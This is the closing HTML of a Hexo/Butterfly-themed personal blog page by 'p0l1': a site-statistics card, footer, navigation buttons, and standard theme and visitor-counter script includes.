card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article :</div><div class="item-count">16</div></div><div class="webinfo-item"><div class="item-name">UV :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">PV :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Update :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-02-06T04:04:54.941Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By p0l1</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+</html>
